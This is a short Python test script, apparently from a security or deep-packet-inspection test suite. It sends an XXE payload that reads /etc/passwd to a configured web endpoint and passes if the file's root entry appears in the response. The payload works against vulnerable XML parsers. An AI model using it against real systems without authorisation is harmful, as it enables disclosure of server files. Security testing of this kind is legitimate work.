#!/usr/bin/env python3
import sys
import os
import requests

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from utils import log_test, print_header, print_summary, reset_results
import config


def run():
    print_header("DPI: XXE Test (TC-XXE-01)")

    xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''

    try:
        r = requests.post(
            f"{config.WEB_BASE}/api/xml",
            data=xxe_payload,
            headers={"Content-Type": "text/xml"},
            timeout=config.REQUEST_TIMEOUT,
        )
        passed = "root:x:0:0:" in r.text
        detail = f"HTTP {r.status_code}, {'found' if passed else 'NOT found'} root entry in response ({len(r.text)} bytes)"
        log_test("TC-XXE-01", "XXE to read /etc/passwd via XML entities", passed, detail)
    except requests.exceptions.ConnectionError:
        log_test("TC-XXE-01", "XXE to read /etc/passwd via XML entities", False,
                 f"Connection refused to {config.WEB_BASE}")
    except Exception as e:
        log_test("TC-XXE-01", "XXE to read /etc/passwd via XML entities", False, str(e))


if __name__ == "__main__":
    reset_results()
    run()
    ok = print_summary()
    sys.exit(0 if ok else 1)
